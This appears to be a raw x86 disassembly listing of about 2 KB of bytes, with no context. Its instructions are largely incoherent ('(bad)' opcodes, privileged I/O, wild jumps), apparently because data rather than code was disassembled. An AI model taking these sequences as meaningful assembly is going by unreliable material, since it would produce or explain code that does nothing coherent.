  4165a9:	les    edi,FWORD PTR [eax-0xe]
  4165ac:	pushf  
  4165ad:	pop    esi
  4165ae:	jne    0x416591
  4165b0:	js     0x4165e2
  4165b2:	push   esi
  4165b3:	or     al,0xfb
  4165b5:	jbe    0x41662c
  4165b7:	xchg   ebp,eax
  4165b8:	pop    ebp
  4165b9:	and    eax,0xae05708b
  4165be:	sub    bl,0xff
  4165c1:	mov    ebx,0xb006967a
  4165c6:	pop    eax
  4165c7:	(bad)  
  4165c8:	ss or  al,0xc
  4165cb:	addr16 dec ecx
  4165cd:	mov    ebp,0xd58aad18
  4165d2:	mov    ah,0x2
  4165d4:	idiv   BYTE PTR [ebx+ebx*8-0x1a]
  4165d8:	pop    esi
  4165d9:	adc    al,BYTE PTR [eax+0x18]
  4165dc:	loop   0x41656f
  4165de:	cwde   
  4165df:	daa    
  4165e0:	push   ss
  4165e1:	sub    BYTE PTR [edx],bl
  4165e3:	pop    edx
  4165e4:	dec    esp
  4165e5:	or     eax,0x6321c92f
  4165ea:	loop   0x416627
  4165ec:	mov    edx,ebx
  4165ee:	pop    ecx
  4165ef:	test   eax,0x9f1c7d9d
  4165f4:	mov    cl,0x40
  4165f6:	or     DWORD PTR [edi-0x60],esp
  4165f9:	jge    0x416651
  4165fb:	cmp    eax,0xcb1c0ab9
  416600:	hlt    
  416601:	push   ss
  416602:	mov    BYTE PTR [esi-0x12],bl
  416605:	into   
  416606:	xchg   esp,eax
  416607:	mov    bh,BYTE PTR [ebx-0x11]
  41660a:	inc    eax
  41660b:	sbb    al,0xaa
  41660d:	push   ecx
  41660e:	dec    esp
  41660f:	inc    esp
  416610:	pop    edi
  416611:	stc    
  416612:	test   eax,0x637a90f8
  416617:	dec    edi
  416618:	add    al,0x7e
  41661a:	enter  0xe45c,0x8d
  41661e:	or     bh,BYTE PTR [ebp+0x7e]
  416621:	add    ebx,DWORD PTR [ecx-0x2225f6ae]
  416627:	mov    esi,0x481b7eff
  41662c:	adc    eax,0x68dc52df
  416631:	fnsave [esi-0x65dc89da]
  416637:	xchg   esp,eax
  416638:	push   eax
  416639:	test   al,0xe
  41663b:	repz mov ebp,0xda19b28
  416641:	aaa    
  416642:	out    0xc4,eax
  416644:	lock fs jp 0x41666c
  416648:	sbb    BYTE PTR [edx],bl
  41664a:	enter  0xdd69,0x97
  41664e:	ins    BYTE PTR es:[edi],dx
  41664f:	daa    
  416650:	repnz in al,0x3d
  416653:	loope  0x416670
  416655:	das    
  416656:	add    eax,0x43116cb6
  41665b:	inc    ebp
  41665c:	mov    eax,DWORD PTR [ebp+0x733172d5]
  416662:	lock sbb edx,0x70210ac0
  416669:	pop    eax
  41666a:	outs   dx,BYTE PTR ds:[esi]
  41666b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41666c:	addr16 sub al,0xc4
  41666f:	stc    
  416670:	fist   DWORD PTR [ebx-0x33]
  416673:	test   al,0x66
  416675:	or     ah,ch
  416677:	pop    esp
  416678:	std    
  416679:	pop    edi
  41667a:	pop    DWORD PTR cs:0x1454716a
  416681:	(bad)  
  416682:	loopne 0x4166fc
  416684:	push   ebx
  416685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416686:	(bad)  
  416688:	ffreep st(3)
  41668a:	jp     0x4166ca
  41668c:	jb     0x4166a2
  41668e:	jl     0x41662d
  416690:	dec    ebx
  416691:	mov    ds:0x5262f44e,al
  416696:	xchg   esi,eax
  416697:	shl    BYTE PTR [ebx-0x1c992eea],1
  41669d:	scas   al,BYTE PTR es:[edi]
  41669e:	mov    DWORD PTR [ebx],ecx
  4166a0:	jns    0x416691
  4166a2:	and    eax,0xa0fc4f16
  4166a7:	and    eax,0x37c53413
  4166ac:	je     0x41663c
  4166ae:	inc    ecx
  4166af:	mov    eax,ds:0xd583dea1
  4166b4:	jno    0x416703
  4166b6:	dec    eax
  4166b7:	inc    esi
  4166b8:	outs   dx,DWORD PTR ds:[esi]
  4166b9:	dec    esp
  4166ba:	jecxz  0x4166ed
  4166bc:	ficom  DWORD PTR [esi+0x75be43ff]
  4166c2:	xor    al,0xb3
  4166c4:	retf   
  4166c5:	jecxz  0x4166ba
  4166c7:	pop    ss
  4166c8:	neg    edx
  4166ca:	inc    esi
  4166cb:	cmp    al,0x5d
  4166cd:	mov    ds,WORD PTR [ecx-0x40]
  4166d0:	cmp    ebp,edi
  4166d2:	sbb    dl,bh
  4166d4:	fs xor eax,0xaaafc34e
  4166da:	nop
  4166db:	adc    DWORD PTR [edi+0x36],0x2d
  4166df:	jmp    0x4166c2
  4166e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166e2:	sbb    bl,0x3d
  4166e5:	add    edi,eax
  4166e7:	popa   
  4166e8:	xchg   DWORD PTR [esi-0x3d3b0d2b],eax
  4166ee:	add    eax,0xbb755688
  4166f3:	clc    
  4166f4:	int3   
  4166f5:	aaa    
  4166f6:	mov    al,0xa3
  4166f8:	or     ah,bh
  4166fa:	dec    edx
  4166fb:	ins    BYTE PTR es:[edi],dx
  4166fc:	adc    DWORD PTR [ebp+0x18f4f9a9],0xef6a8c35
  416706:	div    dl
  416708:	lahf   
  416709:	pop    eax
  41670a:	ja     0x4166f5
  41670c:	out    dx,eax
  41670d:	cmovp  edx,DWORD PTR [esi+0x1a]
  416711:	push   ebp
  416712:	or     DWORD PTR [edx],0x1bf1b31a
  416718:	lahf   
  416719:	js     0x41677d
  41671b:	je     0x4166d4
  41671d:	cmp    BYTE PTR [ecx+0x22],dl
  416720:	xchg   ebx,eax
  416721:	test   BYTE PTR [ebp-0x64],al
  416724:	inc    edi
  416725:	and    dl,BYTE PTR [edx-0x41]
  416728:	adc    eax,0xb18d74f8
  41672d:	das    
  41672e:	add    al,0xe8
  416730:	pop    ds
  416731:	jb     0x41672e
  416733:	mov    bl,0x19
  416735:	test   BYTE PTR [edi],al
  416737:	ret    0x9b61
  41673a:	aas    
  41673b:	and    al,0xff
  41673d:	xchg   BYTE PTR [esi],bh
  41673f:	xchg   esi,eax
  416740:	scas   eax,DWORD PTR es:[edi]
  416741:	xor    al,0xd
  416743:	pop    ecx
  416744:	and    al,0xb1
  416746:	xchg   ebx,eax
  416747:	sbb    ebp,DWORD PTR [ecx]
  416749:	dec    edi
  41674a:	adc    al,0xb8
  41674c:	cmp    BYTE PTR [ecx-0x9],bh
  41674f:	mov    ebx,0xe1c11a95
  416754:	test   DWORD PTR [edx+0x35],ebx
  416757:	jl     0x416754
  416759:	cmp    BYTE PTR [ecx+0x1752d85c],al
  41675f:	and    BYTE PTR [edx-0x12e8582e],dl
  416765:	inc    ebp
  416766:	loopne 0x4167b2
  416768:	inc    esi
  416769:	pop    esp
  41676a:	jne    0x41673c
  41676c:	pop    ecx
  41676d:	push   es
  41676e:	nop
  41676f:	ja     0x41673f
  416771:	add    BYTE PTR [ecx],0xeb
  416774:	retf   
  416775:	shr    DWORD PTR [eax],1
  416777:	push   0xcdbfcea6
  41677c:	out    0x74,al
  41677e:	loopne 0x416792
  416780:	fdivr  DWORD PTR [ebx-0x345a3f43]
  416786:	iret   
  416787:	xchg   ebp,eax
  416788:	imul   edx,DWORD PTR [ecx],0xffffff95
  41678b:	cli    
  41678c:	jmp    FWORD PTR [ebp-0x415d94f9]
  416792:	sbb    eax,0x5bdbe520
  416797:	rcr    DWORD PTR [ebp+0x369e3f86],cl
  41679d:	and    DWORD PTR [edi+0x79],esi
  4167a0:	xor    BYTE PTR [edx-0x3de84a7d],0x45
  4167a7:	jb     0x4167d3
  4167a9:	sub    edx,ebp
  4167ab:	jmp    0x4167ae
  4167ad:	cmp    al,0x62
  4167af:	adc    bl,bh
  4167b1:	in     al,dx
  4167b2:	stos   BYTE PTR es:[edi],al
  4167b3:	ins    DWORD PTR es:[edi],dx
  4167b4:	jecxz  0x416745
  4167b6:	pop    ds
  4167b7:	imul   DWORD PTR [ebp+ecx*4-0x11]
  4167bb:	sbb    DWORD PTR [esi],esp
  4167bd:	mov    eax,0xe968378e
  4167c2:	rsqrtps xmm3,XMMWORD PTR [esi-0x39]
  4167c6:	into   
  4167c7:	lods   eax,DWORD PTR ds:[esi]
  4167c9:	ins    WORD PTR es:[edi],dx
  4167cb:	rcr    DWORD PTR [edx*1-0x1881b584],0x2b
  4167d3:	xchg   edx,eax
  4167d4:	and    DWORD PTR [edi-0x67],ecx
  4167d7:	shr    BYTE PTR [edi],cl
  4167d9:	jne    0x416768
  4167db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167dc:	pop    ebp
  4167dd:	push   eax
  4167de:	add    BYTE PTR [edx+0x1],bl
  4167e1:	or     al,0x1e
  4167e3:	and    al,0xe8
  4167e5:	(bad)  
  4167e6:	mov    ds:0xb064679d,al
  4167eb:	add    esp,DWORD PTR [edi-0x7fce3041]
  4167f1:	je     0x4167d4
  4167f3:	dec    ebx
  4167f4:	inc    ecx
  4167f5:	add    ah,al
  4167f7:	fistp  WORD PTR [ecx+0xa]
  4167fa:	ret    0xcad3
  4167fd:	jno    0x4167f1
  4167ff:	xchg   edx,eax
  416800:	jae    0x4167f4
  416802:	retf   0x6b41
  416805:	mov    dl,BYTE PTR ds:0x2011f4cb
  41680b:	ds cmc 
  41680d:	mov    ds:0xc046ac36,eax
  416812:	dec    edx
  416813:	outs   dx,BYTE PTR ds:[esi]
  416814:	cs and esp,esp
  416817:	out    dx,al
  416818:	dec    esi
  416819:	rcr    DWORD PTR gs:[edx-0x43],0x81
  41681e:	call   0xa6602b48
  416823:	push   edx
  416824:	mov    eax,ds:0xb78017fa
  416829:	mov    ds:0x1a02d36b,eax
  41682e:	out    dx,al
  41682f:	add    al,0x5
  416831:	push   esp
  416832:	xor    DWORD PTR [ecx+edi*1],ecx
  416835:	mul    DWORD PTR [edi]
  416837:	or     edi,DWORD PTR [ecx]
  416839:	sub    edx,DWORD PTR [edi]
  41683b:	ror    BYTE PTR [esi-0x62],1
  41683e:	scas   al,BYTE PTR es:[edi]
  41683f:	inc    ecx
  416840:	adc    cl,bl
  416842:	cli    
  416843:	jge    0x416851
  416845:	adc    bh,BYTE PTR [esi+esi*4]
  416848:	iret   
  416849:	fisub  WORD PTR ds:0xac00536a
  41684f:	sbb    dl,BYTE PTR [edx+0x291243b3]
  416855:	and    bl,BYTE PTR [esi]
  416857:	add    al,0xbe
  416859:	outs   dx,DWORD PTR ds:[esi]
  41685a:	adc    ebp,DWORD PTR [eax+0x1c77dd86]
  416860:	jle    0x416875
  416862:	fs sub edx,eax
  416865:	push   ebx
  416866:	push   edi
  416867:	xor    DWORD PTR [edi-0x12],ebx
  41686a:	int3   
  41686b:	sbb    al,al
  41686d:	add    BYTE PTR [eax],0x85
  416870:	mov    edx,0xe68cc3f9
  416875:	mov    bl,0x73
  416877:	fisub  WORD PTR [edx-0x71]
  41687a:	cs dec edx
  41687c:	addr16 (bad) 
  41687e:	add    eax,0x5016bf38
  416883:	stos   BYTE PTR es:[edi],al
  416884:	test   BYTE PTR [edi],bh
  416886:	push   edx
  416887:	push   es
  416888:	retf   
  416889:	stos   BYTE PTR es:[edi],al
  41688a:	xor    eax,0x30c07dec
  41688f:	psraw  mm1,mm2
  416892:	adc    ebx,DWORD PTR [eax+0x421bba6]
  416898:	xor    eax,0xf94b185b
  41689d:	cmp    DWORD PTR [ecx-0x1],0xd5497f43
  4168a4:	dec    esp
  4168a5:	inc    ebp
  4168a6:	ins    BYTE PTR es:[edi],dx
  4168a7:	int    0xf2
  4168a9:	push   esi
  4168aa:	fwait
  4168ab:	mov    ebx,0xc63dabc4
  4168b0:	pop    esi
  4168b1:	shl    DWORD PTR [edi-0x7e],1
  4168b4:	icebp  
  4168b5:	test   al,0x93
  4168b7:	lahf   
  4168b8:	inc    edi
  4168b9:	imul   ebp,DWORD PTR [edi-0x5e],0x4
  4168bd:	or     al,0xd7
  4168bf:	ins    DWORD PTR es:[edi],dx
  4168c0:	cli    
  4168c1:	rcl    edi,cl
  4168c3:	call   0xa3911c8f
  4168c8:	mov    es,WORD PTR [esi]
  4168ca:	pop    ebp
  4168cb:	cld    
  4168cc:	add    eax,0x985d33a9
  4168d1:	frstor [ebp+0x2f]
  4168d4:	push   0xffffff99
  4168d6:	enter  0xe630,0x20
  4168da:	ror    cl,cl
  4168dc:	sbb    al,0xb1
  4168de:	es mov ah,0xa5
  4168e1:	jecxz  0x416901
  4168e3:	adc    BYTE PTR [edi-0x468fa5f6],dl
  4168e9:	sub    BYTE PTR [esi],dl
  4168eb:	sbb    ebx,ecx
  4168ed:	addr16 jle 0x41689d
  4168f0:	jno    0x4168c0
  4168f2:	imul   ebp,DWORD PTR [eax-0x1f],0xecabaa7b
  4168f9:	retf   0x9f62
  4168fc:	push   ebp
  4168fd:	mov    ds,WORD PTR [edx+ecx*4-0x48b287f0]
  416904:	push   ecx
  416905:	loope  0x41692c
  416907:	pop    esi
  416908:	bound  edx,QWORD PTR [edi]
  41690a:	sub    al,0x48
  41690c:	push   0x1a
  41690e:	xor    ecx,DWORD PTR [edx]
  416910:	rol    DWORD PTR [eax+0x576f2d19],1
  416916:	nop
  416917:	shr    DWORD PTR [edi+0x54],0xe5
  41691b:	out    dx,al
  41691c:	icebp  
  41691d:	mov    edi,0x66cf9fd9
  416922:	jl     0x41692a
  416924:	stc    
  416925:	mov    edx,0xfe84089d
  41692a:	fisttp DWORD PTR [edi+0x38e82991]
  416930:	mov    dh,0xd6
  416932:	lods   eax,DWORD PTR ds:[esi]
  416933:	inc    eax
  416934:	sbb    DWORD PTR [edi],edx
  416936:	pop    ecx
  416937:	xchg   ebx,eax
  416938:	xor    BYTE PTR [ebx-0x78],bh
  41693b:	loop   0x4168c9
  41693d:	das    
  41693e:	xchg   ecx,eax
  41693f:	stos   BYTE PTR es:[edi],al
  416940:	imul   edi,DWORD PTR ds:0x59101b49,0x1a28fe90
  41694a:	or     BYTE PTR [esi+0x7d],bl
  41694d:	add    al,0xf
  41694f:	js     0x4168da
  416951:	pop    es
  416952:	js     0x416969
  416954:	(bad)  
  416955:	sub    eax,0xb44e088
  41695a:	or     ah,bh
  41695c:	ret    0xe9e7
  41695f:	inc    ebp
  416960:	mul    DWORD PTR [edx-0x1d]
  416963:	cmp    dl,dl
  416965:	add    bl,BYTE PTR [edi-0x6d6671cf]
  41696b:	pushf  
  41696c:	pop    ebx
  41696d:	daa    
  41696e:	cmp    eax,0xe140519f
  416973:	(bad)  
  416975:	mov    ecx,0x956c7659
  41697a:	sbb    eax,0xe25cd9a1
  41697f:	xor    esp,ebx
  416981:	xor    BYTE PTR [ecx+0x772fb11c],0xd6
  416988:	and    al,0xd9
  41698a:	mov    esp,ss
  41698c:	popa   
  41698d:	push   esi
  41698e:	dec    eax
  41698f:	scas   al,BYTE PTR es:[edi]
  416990:	rcr    DWORD PTR [esi+0x958329c],cl
  416996:	inc    edi
  416997:	mov    bh,0x93
  416999:	mov    al,ds:0x89db6949
  41699e:	js     0x416974
  4169a0:	push   es
  4169a1:	cld    
  4169a2:	add    edx,DWORD PTR [esi]
  4169a4:	cmp    al,0x4d
  4169a6:	jb     0x41697a
  4169a8:	hlt    
  4169a9:	daa    
  4169aa:	aaa    
  4169ab:	xor    esi,DWORD PTR [eax-0x8]
  4169ae:	cs dec ebx
  4169b0:	push   edi
  4169b1:	add    edx,esi
  4169b3:	add    ch,0x17
  4169b6:	cmp    BYTE PTR [esi-0x78],bl
  4169b9:	in     eax,0x6d
  4169bb:	scas   eax,DWORD PTR es:[edi]
  4169bc:	fsub   QWORD PTR [ebx-0x70583525]
  4169c2:	push   ss
  4169c3:	jmp    0x4169de
  4169c5:	loope  0x4169ce
  4169c7:	fist   WORD PTR [eax+eax*2-0x576c3cad]
  4169ce:	lea    eax,[esi+ecx*8]
  4169d1:	(bad)  
  4169d2:	aad    0xa
  4169d4:	jbe    0x416990
  4169d6:	loop   0x41695d
  4169d8:	jge    0x416a46
  4169da:	imul   esp,DWORD PTR [esp+edx*2+0x2b],0xffffffd9
  4169df:	fwait
  4169e0:	inc    edx
  4169e1:	and    BYTE PTR [eax+0x73579aef],0xf3
  4169e8:	mov    esi,0xe839024
  4169ed:	sub    ebx,DWORD PTR [edi+ebx*8-0x2c]
  4169f1:	or     esi,ecx
  4169f3:	mov    dl,0x4d
  4169f5:	test   eax,0xd7af48b3
  4169fa:	loop   0x4169d5
  4169fc:	jp     0x416a4d
  4169fe:	rol    dl,1
  416a00:	dec    esi
  416a01:	shld   esi,ebx,0xf1
  416a05:	ret    
  416a06:	fisub  DWORD PTR [eax+0x75]
  416a09:	dec    edx
  416a0a:	test   BYTE PTR [edi],al
  416a0c:	push   ebp
  416a0d:	adc    edi,edx
  416a0f:	pop    eax
  416a10:	ja     0x416a67
  416a12:	lods   al,BYTE PTR ds:[esi]
  416a13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a14:	push   es
  416a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a16:	lock test ah,bh
  416a19:	mov    bl,0x9f
  416a1b:	xor    bl,BYTE PTR ds:0x6a8f0f89
  416a21:	data16 mov ds:0xfb9c6440,al
  416a27:	sbb    eax,0x110d2fbc
  416a2c:	xor    al,0x33
  416a2e:	jl     0x416a53
  416a30:	outs   dx,BYTE PTR ds:[esi]
  416a31:	add    al,BYTE PTR [eax+ebp*1-0x6eca82e]
  416a38:	jae    0x4169be
  416a3a:	sub    al,0x1f
  416a3c:	(bad)  
  416a3d:	jle    0x416a6e
  416a3f:	fst    DWORD PTR [ebp-0xb]
  416a42:	adc    eax,0x2330fb31
  416a47:	rcr    edx,cl
  416a49:	repz sbb edx,DWORD PTR ds:0x783c0b98
  416a50:	xchg   esi,eax
  416a51:	or     cl,dl
  416a53:	retf   0xd79c
  416a56:	shl    edi,0xc2
  416a59:	and    DWORD PTR [ebx],eax
  416a5b:	int    0x51
  416a5d:	add    BYTE PTR [esi],bh
  416a5f:	std    
  416a60:	adc    cl,BYTE PTR [bx-0x51b2]
  416a65:	iret   
  416a66:	cmp    BYTE PTR [ecx],0x23
  416a69:	(bad)  [edi+0xa]
  416a6c:	mov    esp,0x95d1bbba
  416a71:	sub    eax,0xf57f39c6
  416a76:	shl    BYTE PTR [edi-0x4622e0e7],1
  416a7c:	mov    eax,0x9ee7cb39
  416a81:	or     cl,BYTE PTR [edx+edx*2-0x68]
  416a85:	pop    DWORD PTR [edx-0x75]
  416a88:	jp     0x416a37
  416a8a:	call   DWORD PTR [ebx+0x630569fc]
  416a90:	ret    
  416a91:	iret   
  416a92:	xor    eax,0xcd89c154
  416a97:	sysexit 
  416a99:	dec    esi
  416a9a:	mov    ebp,0xb9b66752
  416a9f:	mov    ah,0x7c
  416aa1:	rol    DWORD PTR [ecx+ecx*8],0x7d
  416aa5:	std    
  416aa6:	ja     0x416a69
  416aa8:	ins    BYTE PTR es:[edi],dx
  416aa9:	call   0xfc0d46bc
  416aae:	pop    ss
  416aaf:	adc    eax,DWORD PTR [ebx-0x48]
  416ab2:	or     BYTE PTR [ecx+eax*8+0x6351553e],0x7
  416aba:	fstp   DWORD PTR [edx-0x10]
  416abd:	repnz cs dec ebp
  416ac0:	inc    ecx
  416ac1:	idiv   DWORD PTR [esi+esi*8]
  416ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ac5:	sti    
  416ac6:	push   cs
  416ac7:	aad    0x8
  416ac9:	xor    DWORD PTR [edx+0x7b],esp
  416acc:	popa   
  416acd:	cdq    
  416ace:	icebp  
  416acf:	popa   
  416ad0:	sbb    al,0x7b
  416ad2:	scas   al,BYTE PTR es:[edi]
  416ad3:	or     BYTE PTR [ecx],bl
  416ad5:	push   eax
  416ad6:	xchg   esi,eax
  416ad7:	mov    cl,0xb7
  416ad9:	sbb    dh,dh
  416adb:	imul   edx,edi,0x1a
  416ade:	fwait
  416adf:	mov    eax,gs
  416ae1:	dec    ebx
  416ae2:	call   0x7817b377
  416ae7:	dec    eax
  416ae8:	jbe    0x416ae8
  416aea:	push   ds
  416aeb:	out    0x89,eax
  416aed:	xor    BYTE PTR [edx],ch
  416aef:	shr    DWORD PTR [esi-0x311deb3a],1
  416af5:	gs dec esp
  416af7:	jae    0x416a7d
  416af9:	jae    0x416b71
  416afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416afc:	(bad)  
  416afd:	lods   al,BYTE PTR ds:[esi]
  416afe:	outs   dx,BYTE PTR ds:[esi]
  416aff:	lds    ebx,FWORD PTR [esi+0x2f7f7812]
  416b05:	loopne 0x416afe
  416b07:	(bad)  
  416b08:	loop   0x416af3
  416b0a:	push   edx
  416b0b:	cmp    eax,DWORD PTR [ebx+0x49]
  416b0e:	nop
  416b0f:	ins    BYTE PTR es:[edi],dx
  416b10:	mov    DWORD PTR [esi-0x78475ff1],0x6e4b5b21
  416b1a:	lods   al,BYTE PTR ds:[esi]
  416b1b:	leave  
  416b1c:	pushf  
  416b1d:	add    DWORD PTR [edi-0x3ec3be72],edi
  416b23:	jp     0x416b8c
  416b25:	mov    WORD PTR [ebx+ecx*8-0x2be5dceb],es
  416b2c:	lods   eax,DWORD PTR ds:[esi]
  416b2d:	add    al,0xf
  416b2f:	loopne 0x416b72
  416b31:	fimul  WORD PTR [eax+0x704bce4b]
  416b37:	out    dx,al
  416b38:	bnd jmp 0xeddd8512
  416b3e:	push   ds
  416b3f:	std    
  416b40:	xor    BYTE PTR [edi-0x12475ae1],dh
  416b46:	ror    DWORD PTR [ebx],cl
  416b48:	xchg   DWORD PTR [eax],eax
  416b4a:	xlat   BYTE PTR ds:[ebx]
  416b4b:	pop    ss
  416b4c:	sbb    DWORD PTR [ebx+edx*4+0x7b],esi
  416b50:	jmp    0xb922:0xa32560d0
  416b57:	aad    0x19
  416b59:	pop    es
  416b5a:	push   eax
  416b5b:	(bad)  [eax-0x69d4899b]
  416b61:	rcr    bl,cl
  416b63:	lahf   
  416b64:	call   0x5a3b8aba
  416b69:	fld    DWORD PTR [esi-0x697145f4]
  416b6f:	or     edi,DWORD PTR cs:[ecx+0x6a]
  416b73:	int    0xf
  416b75:	aad    0x23
  416b77:	fcomp  QWORD PTR [edi]
  416b79:	xor    BYTE PTR [edi-0x4f],bl
  416b7c:	leave  
  416b7d:	aaa    
  416b7e:	dec    ebx
  416b7f:	push   eax
  416b80:	stos   BYTE PTR es:[edi],al
  416b81:	bound  ebx,QWORD PTR [ecx+0x1b71f53d]
  416b87:	cld    
  416b88:	mov    DWORD PTR [edx+0x722e3894],ebx
  416b8e:	jo     0x416bd5
  416b90:	gs jo  0x416b20
  416b93:	int    0xd3
  416b95:	jbe    0x416b7b
  416b97:	mov    ecx,0xe03ab872
  416b9c:	repnz shl ebx,1
  416b9f:	sub    esi,DWORD PTR [ebx-0x1b]
  416ba2:	mov    ecx,0xc7f05e8a
  416ba7:	or     BYTE PTR [esi+edx*8+0x2a],bl
  416bab:	push   cs
  416bac:	mov    ebx,0xc7e4581d
  416bb1:	xor    al,0x8a
  416bb3:	int    0x9c
  416bb5:	and    BYTE PTR [ebx+0x7e],al
  416bb8:	xor    eax,0x52a01426
  416bbd:	jg     0x416b4e
  416bbf:	cmp    BYTE PTR [ebx-0x10d13af7],cl
  416bc5:	scas   eax,DWORD PTR es:[edi]
  416bc6:	mov    eax,0x5af1bc41
  416bcb:	mov    eax,0xd157ae26
  416bd0:	pop    edx
  416bd1:	rcr    BYTE PTR [ecx+edi*2-0x135f6dd4],cl
  416bd8:	jb     0x416b86
  416bda:	push   ebx
  416bdb:	xchg   ebx,eax
  416bdc:	or     cl,BYTE PTR ds:0x12a7ea41
  416be2:	xchg   ebx,eax
  416be3:	arpl   WORD PTR [edx],bp
  416be5:	pop    eax
  416be6:	mov    ebx,0x8184fd09
  416beb:	mov    cl,dl
  416bed:	loopne 0x416c18
  416bef:	imul   edx,DWORD PTR [esp+edi*4],0x1c63e8c4
  416bf6:	div    BYTE PTR [ebx+0x4d]
  416bf9:	push   ds
  416bfa:	dec    esi
  416bfb:	into   
  416bfc:	push   ds
  416bfd:	rcr    BYTE PTR [esi+0x303bd53e],cl
  416c03:	jbe    0x416bfb
  416c05:	repnz hlt 
  416c07:	aam    0x10
  416c09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c0a:	out    dx,al
  416c0b:	(bad)  [ebp+0x75cf7980]
  416c11:	cli    
  416c12:	sub    eax,0xc024566c
  416c17:	push   cs
  416c18:	(bad)  
  416c19:	aad    0x7a
  416c1b:	and    al,0x8e
  416c1d:	lea    esp,ds:0x7f3ced22
  416c23:	int    0x30
  416c25:	(bad)  [ebx+0x24]
  416c28:	(bad)  
  416c29:	push   cs
  416c2a:	cs xor ebp,0xffffff9f
  416c2e:	jl     0x416bee
  416c30:	pop    eax
  416c31:	outs   dx,BYTE PTR ds:[esi]
  416c32:	in     al,0xfe
  416c34:	aam    0xb7
  416c36:	imul   esp,DWORD PTR [ecx-0x40406e80],0x2c
  416c3d:	fs pop esi
  416c3f:	or     al,cl
  416c41:	push   es
  416c42:	adc    esi,DWORD PTR [edx+0x52cb11bf]
  416c48:	mov    ch,0x66
  416c4a:	ret    0xe5ce
  416c4d:	data16 seta BYTE PTR [ebx]
  416c51:	fisttp WORD PTR ds:0xde25d727
  416c57:	xchg   DWORD PTR [edi-0x4084219a],edi
  416c5d:	loopne 0x416c7a
  416c5f:	sub    ebx,DWORD PTR [ebp-0x23]
  416c62:	pop    es
  416c63:	dec    ebp
  416c64:	sub    ebx,esi
  416c66:	mov    bh,dh
  416c68:	cmp    DWORD PTR [edi],ecx
  416c6a:	cld    
  416c6b:	mov    bh,0xe0
  416c6d:	in     al,dx
  416c6e:	sbb    al,0x88
  416c70:	stos   BYTE PTR es:[edi],al
  416c71:	daa    
  416c72:	pop    ebp
  416c73:	inc    esi
  416c74:	or     DWORD PTR [esi+edx*2-0x20],ecx
  416c78:	icebp  
  416c79:	jne    0x416c97
  416c7b:	aam    0x66
  416c7d:	arpl   dx,si
  416c7f:	daa    
  416c80:	push   edi
  416c81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c82:	lahf   
  416c83:	es mov ebp,0xa08cb40b
  416c89:	xor    eax,0x3cc5eaf7
  416c8e:	pop    edi
  416c8f:	jns    0x416ce2
  416c91:	ins    BYTE PTR es:[edi],dx
  416c92:	in     eax,0x9b
  416c94:	pop    eax
  416c95:	dec    ebx
  416c96:	adc    eax,0x84d42bbc
  416c9b:	(bad)
  416c9e:	xchg   ebp,eax
  416c9f:	sub    eax,0x98548fc1
  416ca4:	pop    eax
  416ca5:	add    edi,DWORD PTR [ebp+0x5c]
  416ca8:	push   eax
  416ca9:	pop    edi
  416caa:	cmp    DWORD PTR [ecx+0x5cae029c],ecx
  416cb0:	(bad)  
  416cb1:	loopne 0x416c7c
  416cb3:	fldcw  WORD PTR [ebp+0x3f02f309]
  416cb9:	inc    ecx
  416cba:	ins    BYTE PTR es:[edi],dx
  416cbb:	mov    ds:0xc7553c26,eax
  416cc0:	jmp    0xd9b8824
  416cc5:	or     DWORD PTR [edi+0x24],esi
  416cc8:	test   eax,0xdec500f4
  416ccd:	ficom  WORD PTR [edi+edi*4-0x79]
  416cd1:	les    edi,FWORD PTR [edi-0x34]
  416cd4:	gs sub eax,0x68b74fa5
  416cda:	add    eax,0x76f84558
  416cdf:	and    DWORD PTR [ebx-0x1f08f376],ebp
  416ce5:	or     al,0x8a
  416ce7:	pusha  
  416ce8:	and    bl,BYTE PTR [esi+0x416d75c8]
  416cee:	mov    ds:0x73ba3d04,al
  416cf3:	jnp    0x416ccd
  416cf5:	daa    
  416cf6:	(bad)  
  416cf7:	jl     0x416cb2
  416cf9:	xchg   BYTE PTR es:[edi],bh
  416cfc:	dec    esp
  416cfd:	ds push cs
  416cff:	jge    0x416d03
  416d01:	mov    ds:0xb76f1bee,eax
  416d06:	xchg   esi,eax
  416d07:	in     eax,dx
  416d08:	loop   0x416cd6
  416d0a:	cld    
  416d0b:	inc    edx
  416d0c:	into   
  416d0d:	(bad)  
  416d0e:	hlt    
  416d0f:	inc    esi
  416d10:	inc    edx
  416d11:	shl    edx,0x73
  416d14:	aaa    
  416d15:	inc    eax
  416d16:	mov    ds:0x2c08f11a,eax
  416d1b:	rol    BYTE PTR [ebx+0x32],1
  416d1e:	sar    DWORD PTR [edi],0x45
  416d21:	inc    ebx
  416d22:	shl    BYTE PTR [ebp-0xa5d7ba5],cl
  416d28:	and    BYTE PTR [ecx+0x6fa97243],ch
  416d2e:	adc    al,0xfe
  416d30:	pop    ebx
  416d31:	retf   
  416d32:	sub    eax,0x8bf38258
  416d37:	adc    al,0xf3
  416d39:	push   ss
  416d3a:	or     ch,BYTE PTR [ebx+0x53771d0c]
  416d40:	mov    ah,0x66
  416d42:	sbb    eax,0x147d466
  416d47:	dec    eax
  416d48:	js     0x416d45
  416d4a:	mov    cl,0xbc
  416d4c:	sahf   
  416d4d:	add    DWORD PTR [ebx],eax
  416d4f:	outs   dx,BYTE PTR ds:[esi]
  416d50:	out    dx,eax
  416d51:	lahf   
  416d52:	push   cs
  416d53:	pop    ss
  416d54:	sub    bh,BYTE PTR [eax]
  416d56:	mov    edi,0x5c2c3099
  416d5b:	int3   
  416d5c:	push   0x8f5d75f6
  416d61:	sbb    eax,0x598d2f1
  416d66:	jnp    0x416d07
  416d68:	cs pop esi
  416d6a:	int    0xdb
  416d6c:	sbb    BYTE PTR [ebp-0x3c117d29],bh
  416d72:	ja     0x416db1
  416d74:	(bad)  
  416d75:	aaa    
  416d76:	xchg   edx,eax
  416d77:	maskmovq mm1,mm7
  416d7a:	nop
  416d7b:	cmp    BYTE PTR [esi+0x72],ch
  416d7e:	(bad)
